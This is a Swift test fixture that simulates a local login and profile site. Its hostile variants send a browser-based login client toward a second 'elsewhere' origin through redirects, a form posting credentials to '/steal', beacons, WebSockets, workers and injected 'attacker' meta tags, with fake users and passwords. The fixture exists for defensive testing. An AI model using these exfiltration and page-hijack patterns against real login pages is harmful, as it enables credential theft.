import Foundation

/// Synthetic website that imitates the shape of the real login/profile workflow, plus
/// hostile variants. Users, passwords and ids are fake. `elsewhere` is a second server
/// that stands in for any origin the browser must never reach.
public final class FixtureSite: @unchecked Sendable {
    public static let password = "synthetic-password-1"
    public static let loginName = "fixture-user"
    public static let userID = 4242

    public enum LoginPage: Sendable {
        case normal
        case redirectToElsewhere
        case redirectToSameHostOtherName       // localhost instead of 127.0.0.1
        case metaRefreshToElsewhere
        case scriptNavigationToElsewhere
        case formPostsToElsewhere
        case subresourcesFromElsewhere
        case openPopup
        case frameFromElsewhere
        case duplicateLoginFields
        case stall                             // login page response is delayed
        case webSockets                        // opens WebSockets to this and another origin
        case serviceWorker                     // registers a service worker
        case workerAndBeacon                   // dedicated worker, beacon, fetch and EventSource elsewhere
    }

    public enum Profile: Sendable {
        case normal
        case reflectedMetaInHead                // attacker meta ahead of the real one, inside head
        case reflectedMetaInBody                // attacker meta in the body (not a head element)
        case reflectedEscapedText               // attacker markup rendered as inert text
        case invalidLogin
    }

    private var acceptedPassword = FixtureSite.password

    #if DEBUG
    /// Synthetic fixture customization; never used by any product target.
    public convenience init(syntheticPassword: String) {
        self.init()
        acceptedPassword = syntheticPassword
    }
    #endif

    private let lock = NSLock()
    private var _loginPage = LoginPage.normal
    private var _profile = Profile.normal
    private var _sessions: Set<String> = []
    public let trusted: FixtureHTTPServer
    public let elsewhere: FixtureHTTPServer

    public var loginPage: LoginPage {
        get { lock.withLock { _loginPage } }
        set { lock.withLock { _loginPage = newValue } }
    }
    public var profile: Profile {
        get { lock.withLock { _profile } }
        set { lock.withLock { _profile = newValue } }
    }

    private var elsewhereOrigin = ""
    private var trustedOrigin = ""

    public init() {
        elsewhere = FixtureHTTPServer { _ in .html("<html><body>elsewhere</body></html>") }
        let box = Box()
        trusted = FixtureHTTPServer { box.site?.route($0) ?? FixtureResponse(status: 500) }
        box.site = self
    }

    public func start() async throws {
        try await elsewhere.start()
        try await trusted.start()
        elsewhereOrigin = elsewhere.origin
        trustedOrigin = trusted.origin
    }

    public func stop() { trusted.stop(); elsewhere.stop() }

    public var origin: URL { URL(string: trusted.origin)! }
    public var elsewhereRequests: [FixtureRequest] { elsewhere.requests }
    public var sessionCount: Int { lock.withLock { _sessions.count } }

    /// Wire-format credential accepted by the fixture: `username`, LF, `password`.
    public static func credential(user: String = loginName, password: String = FixtureSite.password) -> Data {
        Data("\(user)\n\(password)".utf8)
    }

    private final class Box: @unchecked Sendable { var site: FixtureSite? }

    private func route(_ request: FixtureRequest) -> FixtureResponse {
        switch (request.method, request.path) {
        case ("GET", "/login"): return loginResponse()
        case ("POST", "/session"): return session(request)
        case ("GET", "/home"): return home(request)
        case ("GET", "/mfa"): return step(title: "Two-factor authentication", field: "<input id=\"otp\" name=\"otp\">", action: "/step")
        case ("GET", "/captcha"): return step(title: "Verify you are human", field: "<div id=\"captcha-container\">challenge</div>", action: "/step")
        case ("POST", "/step"): return completeStep(request)
        case ("GET", "/pixel"): return FixtureResponse(status: 200, headers: ["Content-Type": "image/gif"],
                                                       body: Data(base64Encoded: "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")!)
        case ("GET", "/sw.js"), ("GET", "/worker.js"):
            return FixtureResponse(status: 200, headers: ["Content-Type": "text/javascript"],
                                   body: Data("fetch('\(elsewhereOrigin)/from-worker').catch(() => {})".utf8))
        case ("GET", "/script.js"): return FixtureResponse(status: 200, headers: ["Content-Type": "text/javascript"], body: Data("window.__fixtureScript=1".utf8))
        default: return FixtureResponse(status: 404)
        }
    }

    private func loginForm(action: String = "/session", extra: String = "") -> String {
        """
        <form action="\(action)" method="post">
        <input type="text" id="login_field" name="login">
        <input type="password" id="password" name="password">
        \(extra)
        <input type="submit" name="commit" value="Sign in">
        </form>
        """
    }

    private func page(head: String = "", body: String) -> FixtureResponse {
        .html("<!doctype html><html><head><title>Fixture</title>\(head)</head><body>\(body)</body></html>")
    }

    private func loginResponse() -> FixtureResponse {
        let out = elsewhereOrigin
        switch loginPage {
        case .normal:
            return page(body: "<img src=\"/pixel\"><script src=\"/script.js\"></script>" + loginForm())
        case .redirectToElsewhere: return .redirect(to: out + "/login")
        case .redirectToSameHostOtherName:
            return .redirect(to: trustedOrigin.replacingOccurrences(of: "127.0.0.1", with: "localhost") + "/login")
        case .metaRefreshToElsewhere:
            return page(head: "<meta http-equiv=\"refresh\" content=\"0;url=\(out)/refresh\">", body: loginForm())
        case .scriptNavigationToElsewhere:
            return page(body: loginForm() + "<script>window.location = '\(out)/script-nav'</script>")
        case .formPostsToElsewhere: return page(body: loginForm(action: out + "/steal"))
        case .subresourcesFromElsewhere:
            return page(body: "<img src=\"\(out)/pixel\"><script src=\"\(out)/script.js\"></script>" + loginForm())
        case .openPopup:
            return page(body: loginForm() + "<script>window.open('\(out)/popup')</script>")
        case .frameFromElsewhere:
            return page(body: "<iframe src=\"\(out)/frame\"></iframe>" + loginForm())
        case .stall:
            Thread.sleep(forTimeInterval: 4)
            return page(body: loginForm())
        case .duplicateLoginFields:
            return page(body: loginForm(extra: "<input type=\"text\" id=\"login_field\" name=\"shadow\">"))
        case .webSockets:
            let same = trustedOrigin.replacingOccurrences(of: "http://", with: "ws://")
            let other = out.replacingOccurrences(of: "http://", with: "ws://")
            return page(body: loginForm() + "<script>for (const u of ['\(other)/sock', '\(same)/sock']) { try { new WebSocket(u) } catch (e) {} }</script>")
        case .serviceWorker:
            return page(body: loginForm() + "<script>navigator.serviceWorker && navigator.serviceWorker.register('/sw.js').catch(() => {})</script>")
        case .workerAndBeacon:
            return page(body: loginForm() + """
                <script>try { new Worker('/worker.js') } catch (e) {}
                navigator.sendBeacon('\(out)/beacon', 'x'); fetch('\(out)/fetch', { mode: 'no-cors' }).catch(() => {});
                try { new EventSource('\(out)/events') } catch (e) {}</script>
                """)
        }
    }

    private func session(_ request: FixtureRequest) -> FixtureResponse {
        let form = Self.formFields(request.body)
        guard form["password"] == acceptedPassword, let login = form["login"], !login.isEmpty else {
            return page(body: "<p id=\"error\">Incorrect username or password.</p>" + loginForm())
        }
        let token = UUID().uuidString
        _ = lock.withLock { _sessions.insert(token) }
        let target: String
        switch login {
        case "mfa-user": target = "/mfa"
        case "captcha-user": target = "/captcha"
        default: target = "/home"
        }
        return .redirect(to: target, headers: ["Set-Cookie": "sid=\(token); Path=/; HttpOnly"])
    }

    private func authenticated(_ request: FixtureRequest) -> Bool {
        guard let cookie = request.headers["cookie"], let range = cookie.range(of: "sid=") else { return false }
        let token = String(cookie[range.upperBound...].prefix { $0 != ";" })
        return lock.withLock { _sessions.contains(token) }
    }

    private func step(title: String, field: String, action: String) -> FixtureResponse {
        page(body: "<h1>\(title)</h1><form action=\"\(action)\" method=\"post\">\(field)<input type=\"submit\" value=\"Verify\"></form>")
    }

    private func completeStep(_ request: FixtureRequest) -> FixtureResponse {
        guard authenticated(request) else { return .redirect(to: "/login") }
        return .redirect(to: "/home")
    }

    private func home(_ request: FixtureRequest) -> FixtureResponse {
        guard authenticated(request) else { return .redirect(to: "/login") }
        let login = profile == .invalidLogin ? "bad login!" : Self.loginName
        let real = "<meta name=\"user-login\" content=\"\(login)\"><meta name=\"octolytics-actor-id\" content=\"\(Self.userID)\">"
        switch profile {
        case .normal, .invalidLogin: return page(head: real, body: "<h1>Dashboard</h1>")
        case .reflectedMetaInHead: return page(head: "<meta name=\"user-login\" content=\"attacker\">" + real, body: "")
        case .reflectedMetaInBody:
            return page(head: real, body: "<div><meta name=\"user-login\" content=\"attacker\"></div>")
        case .reflectedEscapedText:
            return page(head: real, body: "<p>&lt;meta name=\"user-login\" content=\"attacker\"&gt;</p>")
        }
    }

    private static func formFields(_ body: Data) -> [String: String] {
        var result: [String: String] = [:]
        for pair in String(decoding: body, as: UTF8.self).split(separator: "&") {
            let parts = pair.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
            guard parts.count == 2 else { continue }
            func decode(_ s: Substring) -> String {
                s.replacingOccurrences(of: "+", with: " ").removingPercentEncoding ?? ""
            }
            result[decode(parts[0])] = decode(parts[1])
        }
        return result
    }
}
